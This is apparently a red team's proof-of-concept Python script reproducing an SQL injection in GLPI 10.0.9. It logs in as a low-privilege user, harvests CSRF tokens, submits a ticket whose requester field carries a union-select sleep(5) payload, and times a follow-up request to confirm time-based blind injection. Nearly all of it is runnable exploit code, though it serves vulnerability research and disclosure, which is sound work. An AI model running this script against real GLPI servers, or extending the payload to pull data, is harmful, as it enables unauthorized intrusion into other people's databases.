# NEVERHACK Group
# Vulnerability Research by NEVERHACK RED TEAM
# Script to SQLi reproduction on GLPI 10.0.9
# Contact :
# grobert@neverhack.com
# mbillaux@neverhack.com
# mmenuet@neverhack.com

import requests
import re
import argparse
import time
import json
from bs4 import BeautifulSoup

USERNAME = 'normal'
PASSWORD = 'normal'

parser = argparse.ArgumentParser()
parser.add_argument('host')
args = parser.parse_args()

session = requests.session()

r = session.get(args.host + '/index.php')

html = BeautifulSoup(r.text, 'html.parser')
login_name = html.find('input', id='login_name').get('name')
login_password = html.find('input', id='login_password').get('name')
login_remember = html.find('input', id='login_remember').get('name')

search = re.search('name="_glpi_csrf_token" value="([^"]+)"', r.text)
csrf = search.group(1)


r = session.post(args.host + '/front/login.php', data={
    login_name: USERNAME,
    login_password: PASSWORD,
    login_remember: 'on',
    '_glpi_csrf_token': csrf
})

search = re.search('glpi:csrf_token" content="([^"]+)"', r.text)
csrf = search.group(1)

actors = {
    "requester": [
        {
            "itemtype": "User",
            "items_id": ["') union select sleep(5),('"]
        }
    ]
}

data = {"_actors": json.dumps(actors), "add": "1", "date[]": '', '_glpi_csrf_token': csrf}
session.post(args.host + '/front/ticket.form.php', data=data)

print('Try sleeping 5 seconds')
before = time.time()
session.get(args.host + '/ajax/common.tabs.php?_target=/front/ticket.form.php&_itemtype=Ticket&_glpi_tab=Ticket$main&ID=1')
print(f'Time slept: {time.time() - before}')
